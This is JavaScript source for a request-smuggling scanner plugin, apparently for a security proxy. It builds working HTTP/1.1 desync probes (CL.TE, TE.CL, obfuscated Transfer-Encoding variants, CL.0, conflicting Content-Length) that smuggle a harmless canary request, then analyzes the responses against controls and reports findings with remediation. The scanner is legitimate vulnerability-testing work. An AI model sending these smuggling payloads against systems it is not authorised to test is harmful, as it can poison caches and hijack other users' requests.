(function () {
  "use strict";

  var B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  function fromBase64(value) {
    var output = "", buffer = 0, bits = 0;
    String(value || "").replace(/=+$/, "").split("").forEach(function (character) {
      var index = B64.indexOf(character); if (index < 0) return;
      buffer = (buffer << 6) | index; bits += 6;
      if (bits >= 8) { bits -= 8; output += String.fromCharCode((buffer >> bits) & 255); }
    });
    return output;
  }
  function toBase64(value) {
    var output = "";
    for (var index = 0; index < value.length; index += 3) {
      var a = value.charCodeAt(index) & 255, hasB = index + 1 < value.length, hasC = index + 2 < value.length;
      var b = hasB ? value.charCodeAt(index + 1) & 255 : 0, c = hasC ? value.charCodeAt(index + 2) & 255 : 0;
      output += B64[a >> 2] + B64[((a & 3) << 4) | (b >> 4)] + (hasB ? B64[((b & 15) << 2) | (c >> 6)] : "=") + (hasC ? B64[c & 63] : "=");
    }
    return output;
  }
  function base(context) {
    var value = context.base_exchange;
    if (!value || !value.exchange_id || !value.url || !value.raw_request_base64) throw new Error("Request Smuggler requires a saved exchange with exact raw request access");
    return value;
  }
  function target(url) {
    var match = String(url).match(/^(https?):\/\/([^/?#]+)([^?#]*)(\?[^#]*)?$/);
    if (!match) throw new Error("target must be HTTP(S)");
    return { url: match[1] + "://" + match[2] + "/", authority: match[2], path: (match[3] || "/") + (match[4] || "") };
  }
  function safePath(value, name) {
    value = String(value || "");
    if (!/^\//.test(value) || /[\r\n]/.test(value) || value.length > 2048) throw new Error(name + " must be a CRLF-free origin-form path");
    return value;
  }
  function inheritedHeaders(exchange, includeAuth) {
    var raw = fromBase64(exchange.raw_request_base64), head = raw.split("\r\n\r\n", 1)[0], output = [];
    head.split("\r\n").slice(1).forEach(function (line) {
      var name = line.split(":", 1)[0].trim().toLowerCase();
      if (!name || /[\r\n]/.test(line) || /^(host|content-length|transfer-encoding|connection|proxy-connection|upgrade|expect|te)$/.test(name)) return;
      if (!includeAuth && /^(authorization|cookie|proxy-authorization)$/.test(name)) return;
      output.push(line);
    });
    return output.slice(0, 64);
  }
  function message(method, path, authority, inherited, extra, body, close) {
    var lines = [method + " " + path + " HTTP/1.1", "Host: " + authority];
    inherited.forEach(function (line) { lines.push(line); });
    if (!inherited.some(function (line) { return /^user-agent\s*:/i.test(line); })) lines.push("User-Agent: HuntProxy-Request-Smuggler/1.1");
    extra.forEach(function (line) { lines.push(line); });
    lines.push("Connection: " + (close ? "close" : "keep-alive"));
    return lines.join("\r\n") + "\r\n\r\n" + (body || "");
  }
  function normalGet(path, parsed, inherited, close) { return message("GET", path, parsed.authority, inherited, [], "", close); }
  function clTe(parsed, path, canaryPath, inherited, marker, transferLines) {
    var prefix = "GET " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker;
    var body = "0\r\n\r\n" + prefix;
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + body.length].concat(transferLines), body, false) + normalGet(path, parsed, inherited, true);
  }
  function teCl(parsed, path, canaryPath, inherited, marker, transferLines) {
    var smuggled = "GET " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\nContent-Length: 0\r\n\r\n";
    var size = smuggled.length.toString(16), body = size + "\r\n" + smuggled + "\r\n0\r\n\r\n";
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + (size.length + 2)].concat(transferLines), body, false) + normalGet(path, parsed, inherited, true);
  }
  function clZero(parsed, path, canaryPath, inherited, marker) {
    var smuggled = "GET " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\n\r\n";
    return message("POST", path, parsed.authority, inherited, ["Content-Length: " + smuggled.length, "Content-Type: text/plain"], smuggled, false) + normalGet(path, parsed, inherited, true);
  }
  function techniques(input, context) {
    var exchange = base(context), parsed = target(exchange.url), inherited = inheritedHeaders(exchange, input.include_auth === true), marker = String(input.marker).toLowerCase();
    var path = safePath(input.probe_path || parsed.path, "probe_path");
    var canaryPath = safePath(input.canary_path || ("/hp-" + marker + "-not-found"), "canary_path");
    var items = [];
    function add(family, name, request, confirmable, polarity) { items.push({ family: family, name: name, request: request, confirmable: confirmable, polarity: polarity || family }); }
    add("cl_te", "canonical CL.TE", clTe(parsed, path, canaryPath, inherited, marker, ["Transfer-Encoding: chunked"]), true);
    add("te_cl", "canonical TE.CL", teCl(parsed, path, canaryPath, inherited, marker, ["Transfer-Encoding: chunked"]), true);
    var permutations = [
      ["tab-separated value", ["Transfer-Encoding:\tchunked"]],
      ["mixed-case name", ["TrAnSfEr-EnCoDiNg: chunked"]],
      ["comma list", ["Transfer-Encoding: gzip, chunked"]],
      ["invalid then valid duplicate", ["Transfer-Encoding: x", "Transfer-Encoding: chunked"]],
      ["valid then invalid duplicate", ["Transfer-Encoding: chunked", "Transfer-Encoding: x"]],
      ["whitespace before colon", ["Transfer-Encoding : chunked"]]
    ];
    permutations.forEach(function (permutation) {
      add("te_te", "TE.TE " + permutation[0] + " (CL.TE oracle)", clTe(parsed, path, canaryPath, inherited, marker, permutation[1]), true, "cl_te");
      add("te_te", "TE.TE " + permutation[0] + " (TE.CL oracle)", teCl(parsed, path, canaryPath, inherited, marker, permutation[1]), true, "te_cl");
    });
    add("cl_0", "CL.0 marker pipeline", clZero(parsed, path, canaryPath, inherited, marker), true);
    var body = "12345";
    add("0_cl", "0.CL whitespace Content-Length diagnostic", message("GET", path, parsed.authority, inherited, ["Content-Length : " + body.length], body, false) + normalGet(path, parsed, inherited, true), false);
    add("parser_discrepancy", "conflicting duplicate Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: 4", "Content-Length: 5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
    add("parser_discrepancy", "signed Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: +5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
    var selected = input.families && input.families.length ? input.families : ["cl_te", "te_cl", "te_te", "cl_0", "0_cl", "parser_discrepancy"];
    return { parsed: parsed, inherited: inherited, path: path, canary_path: canaryPath, items: items.filter(function (item) { return selected.indexOf(item.family) !== -1; }).slice(0, Math.max(1, Math.min(Number(input.max_techniques || 20), 20))) };
  }
  function options(input) {
    return { response_mode: "until_idle", read_timeout_ms: Math.max(1000, Math.min(Number(input.read_timeout_ms || 8000), 30000)), idle_timeout_ms: Math.max(500, Math.min(Number(input.idle_timeout_ms || 1500), 5000)), half_close_write: false };
  }
  function raw(id, parsed, request, input) { return { id: id, type: "raw_http1", target_url: parsed.url, request_base64: toBase64(request), use_project_cookies: false, options: options(input) }; }
  function plan(input, context) {
    if (input.confirm_intrusive !== true) throw new Error("desynchronization testing requires confirm_intrusive=true");
    if (!/^[a-z0-9]{8,32}$/i.test(String(input.marker || ""))) throw new Error("marker must be a unique 8-32 character alphanumeric value");
    var set = techniques(input, context), repeats = Math.max(3, Math.min(Number(input.repeats || 5), 5)), operations = [];
    for (var direct = 0; direct < 2; direct += 1) {
      operations.push(raw("direct-base-" + direct, set.parsed, normalGet(set.path, set.parsed, set.inherited, true), input));
      operations.push(raw("direct-canary-" + direct, set.parsed, normalGet(set.canary_path, set.parsed, set.inherited, true), input));
    }
    set.items.forEach(function (technique, index) {
      for (var repeat = 0; repeat < repeats; repeat += 1) {
        var clean = normalGet(set.path, set.parsed, set.inherited, false) + normalGet(set.path, set.parsed, set.inherited, true);
        operations.push(raw("control-" + index + "-" + repeat, set.parsed, clean, input));
        operations.push(raw("probe-" + index + "-" + repeat, set.parsed, technique.request, input));
      }
    });
    return { operations: operations, result: { repeats: repeats, auth_included: input.include_auth === true, canary_path: set.canary_path, techniques: set.items.map(function (item) { return { family: item.family, name: item.name, polarity: item.polarity, canary_confirmation: item.confirmable }; }), limitations: ["Exact HTTP/1 only; malformed HTTP/2, downgrade, and tunneling require a future H2 transport", "Pause-based and browser client-side desync probes are disabled until the host can read before completing a same-socket write", "Authentication is excluded unless include_auth=true"] } };
  }
  function byId(observations) { var output = {}; observations.forEach(function (item) { output[item.id] = item; }); return output; }
  function rawResult(item) { return item && !item.error && item.raw ? item.raw : null; }
  function outcome(item) { var value = rawResult(item); return value ? String(value.read_outcome || "missing") : "error"; }
  function transcript(item) { var value = rawResult(item); return value ? fromBase64(value.response_transcript_base64 || value.response_base64 || "") : ""; }
  function segments(item) {
    var value = rawResult(item), bytes = transcript(item); if (!value) return [];
    return (value.responses || []).map(function (response) { return { status: response.status_code || null, text: bytes.slice(response.offset, response.offset + response.length) }; });
  }
  function normalized(value) { return String(value || "").toLowerCase().replace(/^(date|set-cookie|x-request-id|traceparent):.*$/gmi, "").replace(/\b[0-9a-f]{8}-[0-9a-f-]{27,}\b/gi, "<id>").replace(/\b\d{10,13}\b/g, "<time>").replace(/\s+/g, " ").trim(); }
  function similarity(left, right) {
    left = normalized(left); right = normalized(right); if (left === right) return 1; if (!left || !right) return 0;
    var a = {}, b = {}, union = {}, same = 0, total = 0;
    left.split(/[^a-z0-9_<>]+/).filter(Boolean).forEach(function (token) { a[token] = 1; union[token] = 1; });
    right.split(/[^a-z0-9_<>]+/).filter(Boolean).forEach(function (token) { b[token] = 1; union[token] = 1; });
    Object.keys(union).forEach(function (token) { total += 1; if (a[token] && b[token]) same += 1; }); return total ? same / total : 0;
  }
  function sameSegment(left, right) { return !!(left && right && left.status === right.status && similarity(left.text, right.text) >= 0.9); }
  function stable(left, right) {
    var a = segments(left), b = segments(right); if (!rawResult(left) || !rawResult(right) || outcome(left) !== outcome(right) || a.length !== b.length) return false;
    for (var index = 0; index < a.length; index += 1) {
      if (a[index].status !== b[index].status) return false;
      var longest = Math.max(a[index].text.length, b[index].text.length, 1), shortest = Math.min(a[index].text.length, b[index].text.length);
      if (!sameSegment(a[index], b[index]) && shortest / longest < 0.9) return false;
    }
    return true;
  }
  function matchesCanary(segment, canary, base) { return !!(segment && canary && base && (canary.status !== base.status ? segment.status === canary.status : sameSegment(segment, canary))); }
  function evidence(items) { return items.map(function (item) { var value = rawResult(item); return value && value.exchange_id; }).filter(Boolean); }
  function analyze(input, observations, context) {
    var map = byId(observations), set = techniques(input, context), repeats = Math.max(3, Math.min(Number(input.repeats || 5), 5)), findings = [], diagnostics = [];
    var baseDirect = [map["direct-base-0"], map["direct-base-1"]], canaryDirect = [map["direct-canary-0"], map["direct-canary-1"]];
    var directStable = stable(baseDirect[0], baseDirect[1]) && stable(canaryDirect[0], canaryDirect[1]);
    var baseSignature = segments(baseDirect[0])[0], canarySignature = segments(canaryDirect[0])[0];
    var canaryDistinct = directStable && baseSignature && canarySignature && (baseSignature.status !== canarySignature.status || !sameSegment(baseSignature, canarySignature));
    var threshold = Math.max(3, Math.ceil(repeats * 0.6));
    set.items.forEach(function (technique, index) {
      var controls = [], probes = [], clean = 0, contaminated = 0, timeouts = 0;
      for (var repeat = 0; repeat < repeats; repeat += 1) {
        var control = map["control-" + index + "-" + repeat], probe = map["probe-" + index + "-" + repeat]; controls.push(control); probes.push(probe);
        var controlSegments = segments(control); if (rawResult(control) && outcome(control) !== "timeout" && controlSegments.length >= 2 && controlSegments.every(function (segment) { return !canaryDistinct || !matchesCanary(segment, canarySignature, baseSignature); })) clean += 1;
        if (technique.confirmable && canaryDistinct && segments(probe).some(function (segment) { return matchesCanary(segment, canarySignature, baseSignature) && !sameSegment(segment, baseSignature); })) contaminated += 1;
        if (outcome(probe) === "timeout" && outcome(control) !== "timeout") timeouts += 1;
      }
      var confirmed = directStable && canaryDistinct && clean === repeats && contaminated >= threshold;
      var candidate = directStable && clean === repeats && timeouts >= threshold;
      diagnostics.push({ family: technique.family, technique: technique.name, polarity: technique.polarity, clean_controls: clean, canary_confirmations: contaminated, probe_only_timeouts: timeouts, repeats: repeats, signal: confirmed ? "marker_contamination" : candidate ? "timing_candidate" : "none" });
      if (confirmed) findings.push({
        title: "Confirmed HTTP/1 request desynchronization: " + technique.name, severity: "high", confidence: "firm",
        explanation: "A harmless marker request was reproducibly parsed out of the ambiguous pipeline in " + contaminated + " of " + repeats + " attempts, while every interleaved clean pipeline remained uncontaminated.",
        remediation: "Reject ambiguous framing at the first hop, normalize Transfer-Encoding and Content-Length consistently across every hop, and close connections after parser errors.",
        evidence_exchange_ids: evidence(baseDirect.concat(canaryDirect, controls, probes)), metadata: { family: technique.family, polarity: technique.polarity, signal: "marker_contamination", confirmations: contaminated, attempts: repeats }
      });
      else if (candidate) findings.push({
        title: "HTTP/1 framing discrepancy candidate: " + technique.name, severity: "medium", confidence: "tentative",
        explanation: "The ambiguous request timed out in " + timeouts + " of " + repeats + " attempts while all interleaved controls completed. Timing alone is not proof of desynchronization, so marker confirmation or manual validation is required.",
        remediation: "Review every HTTP hop for inconsistent framing rules and validate on an isolated connection before treating this as exploitable.",
        evidence_exchange_ids: evidence(controls.concat(probes)), metadata: { family: technique.family, polarity: technique.polarity, signal: "timing_candidate", attempts: repeats }
      });
    });
    return { findings: findings, result: { direct_controls_stable: directStable, canary_distinct: !!canaryDistinct, diagnostics: diagnostics, limitations: ["Firm findings require same-connection marker contamination; timeout-only signals remain tentative.", "HTTP/2 parser discrepancies and tunneling are not supported by the current host.", "Pause-based and browser client-side desync tests are intentionally not claimed."] } };
  }
  globalThis.HuntProxyPlugin = { plan: plan, analyze: analyze };
}());
